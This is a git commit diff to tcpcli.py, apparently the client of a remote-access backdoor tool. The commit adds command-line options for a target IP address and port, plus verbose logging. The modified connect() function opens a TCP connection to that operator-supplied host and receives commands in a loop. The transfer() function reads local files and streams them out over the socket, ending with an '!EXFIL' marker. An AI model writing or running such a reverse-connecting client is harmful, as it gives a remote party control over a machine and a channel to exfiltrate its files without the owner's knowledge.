26e8ebe43cb56c91c5564044f7a23b16ece4c01a
TheRealHetfield <pvld9afi30@veil.email>
2017-10-28 18:33:38 -0500

    Added options parser and updated transfer function

--- tcpcli.py
+++ tcpcli.py
@@ -5,6 +5,14 @@ import subprocess
 import os
 from lib.banner import *
 from lib.functions import *
+import argparse
+
+
+parser = argparse.ArgumentParser()
+parser.add_argument("ip", help="The IP address to connect to.")
+parser.add_argument("port", help="The TCP port to connect on.")
+parser.add_argument("-v", "--verbose", help="Increase verbosity of output.", action="store_true")
+args = parser.parse_args()
 
 
 #
@@ -13,11 +21,24 @@ from lib.functions import *
 def transfer(s,file):
 	if os.path.exists(file):
 		f = open(file, 'rb')
+
+		if args.verbose:
+			print_info("Transferring file " + file)
+
 		packet = f.read(1024)
 		while packet != '':
 			s.send(packet)
+
+			if args.verbose:
+				print_info("!")
+
 			packet = f.read(1024)
+		
 		s.send('!EXFIL')
+
+		if args.verbose:
+			print_success("Transfer Complete")
+
 		f.close()
 
 	else:
@@ -29,7 +50,13 @@ def transfer(s,file):
 #
 def connect():
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.connect(('localhost', 8080))
+	if args.verbose:
+		print_info("Trying connection to: " + args.ip + ":" + args.port + "\n")
+
+	s.connect((args.ip, int(args.port)))
+
+	if args.verbose:
+		print_success("Connected to: " + args.ip + ":" + args.port + "\n")
 
 	while True:
 		cmd = s.recv(1024)
@@ -57,7 +84,9 @@ def connect():
 #
 #
 def main():
-	print(clibanner)
+	if args.verbose:
+		print(clibanner)
+
 	connect()
 
 
